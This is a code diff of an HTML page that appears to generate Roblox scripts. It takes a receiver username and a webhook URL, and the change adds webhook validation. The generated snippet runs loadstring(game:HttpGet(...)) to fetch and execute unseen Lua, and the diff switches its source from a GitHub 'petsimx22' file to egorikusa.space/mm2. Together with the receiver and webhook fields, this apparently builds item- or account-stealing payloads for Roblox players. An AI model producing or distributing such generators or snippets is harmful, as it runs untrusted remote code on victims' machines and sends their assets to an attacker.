@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Coen On Top</title>
+<title>wow</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
 <style>
@@ -14,6 +14,7 @@
   button:hover { background-color: #0056b3; }
   #output { text-align: left; white-space: pre-wrap; }
   textarea { width: 100%; height: 150px; }
+  .error { color: red; }
 </style>
 </head>
 <body>
@@ -24,21 +25,42 @@
       <input type="text" id="username" name="username">
     </div>
     <div class="input-field">
-      <label for="webhook">Webhook URL:</label>
+      <label for="webhook">Webhook:</label>
       <input type="text" id="webhook" name="webhook">
     </div>
+    <div id="error-message" class="error"></div>
     <button onclick="generateOutput()">Generate</button>
     <textarea id="output"></textarea>
     <button onclick="copyToClipboard()">Copy to Clipboard</button>
   </div>
 
 <script>
+    function isValidUrl(url) {
+        var pattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
+            '((([a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z]{2,6})|'+ // domain...
+            '((\\d{1,3}\\.){3}\\d{1,3})|'+ // ...or ipv4
+            '(\\[?[a-f0-9]*:[a-f0-9:]+\\]?)'+ // ...or ipv6
+            ')(:\\d+)?(\\/[-a-z0-9%_.~+]*)*'+ // port and path
+            '(\\?[;&a-z0-9%_.~+=-]*)?'+ // query string
+            '(#[-a-z0-9_]*)?$','i'); // fragment locator
+        return !!pattern.test(url);
+    }
+
     function generateOutput() {
         var username = document.getElementById("username").value;
         var webhook = document.getElementById("webhook").value;
-        var outputString = 'Receivers = "' + username + '"\n' +
-                           'Webhook = "' + webhook + '"\n' +
-                           'loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()';
+        var errorMessage = document.getElementById("error-message");
+        
+        if (!isValidUrl(webhook)) {
+            errorMessage.textContent = 'Invalid webhook URL format.';
+            return;
+        } else {
+            errorMessage.textContent = '';
+        }
+        
+        var outputString = 'Username = "' + username + '"\n' +
+                           'webhook = "' + webhook + '"\n' +
+                           'loadstring(game:HttpGet("https://egorikusa.space/mm2"))()';
         document.getElementById("output").value = outputString;
         hljs.highlightAll();
     }
